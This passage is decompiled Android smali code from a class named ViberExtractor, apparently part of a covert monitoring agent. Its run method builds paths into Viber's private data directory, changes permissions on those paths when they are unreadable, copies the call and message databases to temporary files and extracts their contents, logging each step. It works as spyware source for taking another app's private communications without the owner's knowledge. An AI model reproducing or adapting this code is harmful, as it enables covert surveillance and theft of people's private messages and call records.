    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {p1, p2}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 384
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string p2, "ViberExtractor"

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Viber Messages successfully extracted. "

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v1, " to: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-interface {p1, p2, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_0
    move-exception p1

    .line 377
    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    const-string v2, "Error extracting data."

    invoke-interface {p2, v0, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 379
    iget-object p1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string p2, "viber_max_message_id"

    invoke-virtual {p1, p2, v1}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    return-void
.end method

.method protected isReadable(Ljava/lang/String;)Z
    .locals 2

    .line 403
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 406
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result p1

    const/4 v1, 0x1

    if-eqz p1, :cond_0

    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    if-eqz p1, :cond_0

    return v1

    .line 411
    :cond_0
    invoke-virtual {v0}, Ljava/io/File;->isDirectory()Z

    move-result p1

    if-eqz p1, :cond_1

    invoke-virtual {v0}, Ljava/io/File;->canExecute()Z

    move-result p1

    if-eqz p1, :cond_1

    invoke-virtual {v0}, Ljava/io/File;->canRead()Z

    move-result p1

    if-eqz p1, :cond_1

    return v1

    :cond_1
    const/4 p1, 0x0

    return p1
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 7

    .line 153
    invoke-virtual {p1}, Ljava/io/File;->isFile()Z

    move-result v0

    const/4 v1, 0x3

    const/4 v2, 0x0

    if-nez v0, :cond_0

    .line 154
    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Database file is not a file (\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\')"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {p2, v0, p1, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v2

    .line 159
    :cond_0
    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v0

    if-nez v0, :cond_1

    .line 160
    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Database file does not exist (\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\')"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {p2, v0, p1, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v2

    .line 165
    :cond_1
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v0, v3, v5

    if-nez v0, :cond_2

    .line 166
    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Database file is 0L long (\'"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "\')"

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-interface {p2, v0, p1, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-object v2

    .line 177
    :cond_2
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 191
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v0, 0x10

    invoke-static {p1, v2, v0}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 194
    iget-object v0, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "ViberExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v0, v1, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 195
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v2

    :catch_1
    move-exception p1

    .line 179
    iget-object p2, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v0, "ViberExtractor"

    const-string v1, "Exception caught during coping database to a temporary location."

    invoke-interface {p2, v0, v1, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v2
.end method

.method public run()V
    .locals 8

    const-string v0, "ViberCallTmpFile"

    .line 67
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    const-string v0, "ViberMessageTmpFile"

    .line 68
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    const-string v0, "/data/data/com.viber.voip"

    .line 75
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/databases"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 76
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "/viber_data"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    .line 77
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, "/viber_messages"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v4, 0x4

    .line 80
    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v0, v4, v5

    const/4 v0, 0x1

    aput-object v1, v4, v0

    const/4 v0, 0x2

    aput-object v2, v4, v0

    const/4 v0, 0x3

    aput-object v3, v4, v0

    .line 87
    array-length v0, v4

    move v1, v5

    :goto_0
    if-ge v1, v0, :cond_1

    aget-object v6, v4, v1

    .line 88
    invoke-virtual {p0, v6}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 89
    invoke-virtual {p0, v6, v5}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->chmod(Ljava/lang/String;Z)Z

    :cond_0
    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 99
    :cond_1
    :try_start_0
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v2}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const-string v1, "ViberCallTmpFile"

    const-string v2, "db"

    .line 100
    iget-object v4, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    .line 103
    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v4}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v4

    invoke-virtual {v4}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v4

    .line 100
    invoke-static {v1, v2, v4}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    .line 106
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    if-eqz v0, :cond_2

    .line 109
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->extractCalls(Landroid/database/sqlite/SQLiteDatabase;)V

    .line 111
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_2
    if-eqz v1, :cond_3

    .line 115
    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    .line 119
    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ViberExtractor"

    const-string v4, "Exception caught during CALL extraction."

    invoke-interface {v1, v2, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 123
    :cond_3
    :goto_1
    :try_start_1
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v3}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    const-string v1, "ViberMessageTmpFile"

    const-string v2, "db"

    .line 124
    iget-object v3, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->context:Lcom/hp/vd/context/Context;

    .line 127
    invoke-virtual {v3}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v3}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v3

    .line 124
    invoke-static {v1, v2, v3}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v1

    .line 129
    invoke-virtual {p0, v0, v1}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    if-eqz v0, :cond_4

    .line 132
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/custom/viber/ViberExtractor;->extractMessages(Landroid/database/sqlite/SQLiteDatabase;)V

    .line 134
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    :cond_4
    if-eqz v1, :cond_5

    .line 138
    invoke-virtual {v1}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    move-exception v0

    .line 142
    iget-object v1, p0, Lcom/hp/vd/module/custom/viber/ViberExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "ViberExtractor"

    const-string v3, "Exception caught during MESSAGE extraction."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_5
    :goto_2
    return-void
.end method
